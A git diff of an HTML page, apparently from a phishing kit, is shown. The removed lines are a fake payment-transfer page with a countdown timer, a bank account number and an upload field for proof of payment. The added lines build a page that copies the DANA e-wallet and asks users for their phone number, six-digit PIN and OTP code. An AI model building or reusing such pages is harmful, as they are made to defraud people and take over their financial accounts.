@@ -3,83 +3,58 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Transfer</title>
+  <title>DANA UI</title>
 
-  <!-- CSS -->
+  <!-- HUBUNGKAN CSS -->
   <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
 
 <div class="container">
-  <div class="card">
 
-    <!-- Header -->
-    <div class="header">
-      <span>Transfer sebelum 5 Mei 2026, 18:00 WIB</span>
-      <span class="timer" id="timer">00:00:00</span>
+  <div class="logo">DANA</div>
+
+  <!-- Screen 1 -->
+  <div class="screen active" id="screen1">
+    <div class="box">
+      <label><input type="radio" checked> Aktifkan Dana Paylater</label>
+      <label><input type="radio"> Aktifkan Dana Cicil</label>
+      <label><input type="radio"> Laporkan Kendala</label>
     </div>
-
-    <!-- Bank -->
-    <div class="section">
-      <div class="bank">
-        <a href="https://rearea22.github.io/Transfer-dana/?v=2">
-  <img src="bri.png" style="width:40px;"> 
-</a>
-        <div>
-          <div style="font-weight:600;">Bank BRI</div>
-          <div style="font-size:13px; color:#555;">
-            FLIPTECH LENTERA INS
-          </div>
-        </div>
-      </div>
-
-      <div class="box">
-        <span>067201000360306</span>
-        <span class="copy" onclick="copy('067201000360306')">Salin</span>
-      </div>
-    </div>
-
-    <!-- Nominal -->
-    <div class="section">
-      
-      <div style="font-size:14px; margin-bottom:8px;">Jumlah Transfer</div>
-      <div class="box">
-        <span>Rp1.500.415</span>
-        <span class="copy" onclick="copy('1500415')">Salin</span>
-      </div>
-    </div>
-
-    <!-- Upload Bukti -->
-<div class="section">
-  <div style="font-weight:600; margin-bottom:8px;">
-    Upload Bukti Transaksi
+    <button class="btn" onclick="next(2)">Konfirmasi</button>
   </div>
 
-  <label for="upload" class="upload-box">
-    <span id="uploadText">Klik untuk upload bukti</span>
-  </label>
-
-  <input type="file" id="upload" hidden>
-
-  <img id="preview" class="preview-img" />
-</div>
-    
-
-    <!-- Note -->
-    <div class="note">
-      <b>Pastikan jumlah transfernya sama ya</b><br>
-      Kode unik akan dikembalikan ke saldo kamu.
-    </div>
-
+  <!-- Screen 2 -->
+  <div class="screen" id="screen2">
+    <input id="phone" class="input" placeholder="+62 811-xxxx-xxxx">
+    <button id="btnPhone" class="btn" disabled>Lanjut</button>
   </div>
+
+  <!-- Screen 3 -->
+  <div class="screen" id="screen3">
+    <div class="pin-box" id="pinInputs">
+      <input maxlength="1"><input maxlength="1"><input maxlength="1">
+      <input maxlength="1"><input maxlength="1"><input maxlength="1">
+    </div>
+    <button id="btnPin" class="btn" disabled>Verifikasi</button>
+  </div>
+
 </div>
 
+<!-- Overlay OTP -->
+<div class="overlay" id="otpOverlay">
+  <h3>Verifikasi OTP</h3>
+  <div class="loader" id="loader"></div>
 
-<!-- Toast -->
-<div id="toast" class="toast"></div>
+  <div class="pin-box" id="otpInputs" style="display:none;">
+    <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
+  </div>
 
-<!-- JS -->
+  <div class="small" id="timer">Kirim ulang (60s)</div>
+</div>
+
+<!-- HUBUNGKAN JS -->
 <script src="script.js"></script>
 
 </body>
